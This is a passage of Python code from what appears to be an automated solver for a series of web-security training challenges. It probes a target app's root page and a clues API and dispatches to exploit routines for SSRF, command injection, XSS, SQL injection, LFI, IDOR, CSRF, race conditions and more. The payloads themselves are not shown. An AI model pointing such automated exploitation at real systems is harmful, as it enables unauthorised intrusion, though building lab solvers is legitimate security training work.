    Mirrors the restored day-19/day-20 dispatcher order (admin/clues-driven apps
    before generic API/IDOR signs, since both link /api/ paths; PHP-viewer/LFI
    evidence before SQLi; backup-exposure investigated last since its only tell is
    a vague comment). Extend this - do not assume a form is SQLi or that an unknown
    page is backup exposure. `evidence` (a dict) is filled in for the caller's notes
    if given; this function never talks to anything but `t`'s own origin. `prompt`
    is the challenge's own prompt text (optional) - only `rec_lfi` uses it, to find
    a "mounted at <path>" objective-file hint; omitting it falls back to the
    documented default path. `initial` may contain already-fetched `/` and
    `/api/clues` `(status, body)` pairs, avoiding duplicate recon requests."""
    evidence = evidence if evidence is not None else {}
    initial = initial or {}
    root = initial.get("/")
    status, html = root if root else t.get("/", save="root")
    evidence["root_status"] = status
    if status != 200:
        evidence["classification"] = "root request failed"
        return None

    # Always try the clues API directly rather than gating on root HTML literally
    # containing "/api/clues": the day-07 app only discloses it via /openapi.json,
    # not a root-page link. A non-200 here just
    # means this app has no clues API; fall through to the other classes.
    cached_clues = initial.get("/api/clues")
    if cached_clues:
        clues_status, clues_body = cached_clues
        try:
            clues = json.loads(clues_body) if clues_status == 200 else None
        except (TypeError, ValueError):
            clues = None
    else:
        clues_status, clues = t.get_json("/api/clues", save="clues")

    if clues_status == 200 and clues:
        evidence["clues"] = clues
        if clues.get("feature_route") and clues.get("policy_format_route"):
            evidence["classification"] = "fail-open remote policy decoder"
            proof = rec_fail_open_policy(t, clues)
            if proof:
                return proof
        if clues.get("feature_route") and clues.get("update_feed") and clues.get("update_policy"):
            evidence["classification"] = "unverified dependency update"
            proof = rec_unverified_update(t, clues)
            if proof:
                return proof
        if all(clues.get(key) for key in
               ("feature_route", "topology_route", "case_directory_route")):
            evidence["classification"] = "SSRF followed by internal IDOR"
            proof = rec_internal_affairs(t, clues)
            if proof:
                return proof
        if clues.get("session_hint") and clues.get("feature_route") and clues.get("secondary_route"):
            evidence["classification"] = "session fixation"
            proof = rec_session_fixation(t, clues)
            if proof:
                return proof
        if clues.get("callback_nonce") and clues.get("feature_route") and clues.get("secondary_route"):
            evidence["classification"] = "reflected XSS + isolated browser callback"
            proof = rec_reflect_callback(t, clues)
            if proof:
                return proof
        if clues.get("feature_route") and clues.get("input_parameter") and "example_path" in clues:
            evidence["classification"] = "OS command injection"
            proof = rec_command_injection(t, clues)
            if proof:
                return proof
        if clues.get("recovery_guide_route") and clues.get("feature_route") and clues.get("secondary_route"):
            evidence["classification"] = "password-reset token / account-id confusion"
            proof = rec_reset_account_confusion(t, clues)
            if proof:
                return proof
        if clues.get("feature_route") and clues.get("secondary_route") and "inventory_route" not in clues:
            # Missing-log, double-spend and SSRF share this clue shape. A read-only
            # secondary GET distinguishes them; never fire the one-shot race merely
            # because the two routes exist.
            status, probe = t.get_json(clues["secondary_route"], save="probe_secondary")
            if status == 200 and isinstance(probe, dict) and probe.get("report", {}).get("fields"):
                evidence["classification"] = "missing audit log event"
                return rec_missing_log_event(t, clues, before=probe)
            if status == 200 and isinstance(probe, dict) and "credits" in probe:
                evidence["classification"] = "credit double-spend (race)"
                return rec_double_spend(t, clues)
            if status == 403 or (isinstance(probe, dict)
                                 and probe.get("error") == "internal_service_only"):
                evidence["classification"] = "SSRF (fetch proxy to internal-only route)"
                return rec_ssrf(t, clues)
            evidence["classification"] = (
                "unclassified feature_route + secondary_route; secondary probe matched no known class")
            return None
        if clues.get("feature_route") and clues.get("deployment") == "trusted_reverse_proxy":
            evidence["classification"] = "trusted-reverse-proxy header spoofing"
            proof = rec_proxy_trust_bypass(t, clues)
            if proof:
                return proof
        if clues.get("feature_route") and clues.get("inventory_route") and "protected_reference" in clues:
            evidence["classification"] = "field/action authorization bypass"
            proof = rec_field_action_bypass(t, clues)
            if proof:
                return proof
        if clues.get("feature_route") and clues.get("protected_reference") is not None \
                and "inventory_route" not in clues and "secondary_route" not in clues:
            evidence["classification"] = "GraphQL field-level authorization bypass"
            proof = rec_graphql_field_bypass(t, clues)
            if proof:
                return proof
        if clues.get("moderator_data_route") and clues.get("receipt_route_template"):
            evidence["classification"] = "stored XSS (moderator bot)"
            proof = rec_stored_xss_bot(t, clues)
            if proof:
                return proof
        if clues.get("render_route") and clues.get("feature_route"):
            evidence["classification"] = "upload content-type/extension bypass"
            proof = rec_upload_bypass(t, clues)
            if proof:
                return proof
        if clues.get("feature_route") and "preferences_route" in clues:
            evidence["classification"] = "CSRF (state-changing GET)"
            proof = rec_csrf(t, clues)
            if proof:
                return proof
        if clues.get("feature_route") and clues.get("event_type") and clues.get("owner_scope"):
            evidence["classification"] = "forged/unsigned webhook event trust"
            proof = rec_forged_webhook_event(t, clues)
            if proof:
                return proof

    if re.search(r'href="[^"]*\.php\?\w+=', html):
        evidence["classification"] = "LFI (path traversal viewer)"
        proof = rec_lfi(t, html, prompt)
        if proof:
            return proof

    if re.search(r'href="(/api/[^"]+)"', html) and re.findall(r'href="(/[a-z]+/\d+)"', html):
        evidence["classification"] = "IDOR"
        proof = rec_idor(t, html)
        if proof:
            return proof

    if re.search(r'<form[^>]*action=[\'"][^\'"]*(search|lookup|explore)', html, re.I):
        evidence["classification"] = "SQL injection (group-closing boolean)"
        proof = rec_sqli_group_close(t, html)
        if proof:
            return proof

    if re.search(r"crawler polic|robots", html, re.I):
        evidence["classification"] = "backup exposure"
        proof = rec_backup(t)
        if proof:
            return proof

    # last resorts, in case the html-based gates above missed a signal (as the
    # day-08 mastery dispatcher's backup-exposure fallback did, extended with sqli).
    if "<form" in html:
        proof = rec_sqli_group_close(t, html)
        if proof:
            evidence["classification"] = "SQL injection (group-closing boolean, fallback)"
            return proof
    evidence.setdefault("classification", "unclassified; tried backup exposure as a last resort")
    return rec_backup(t)
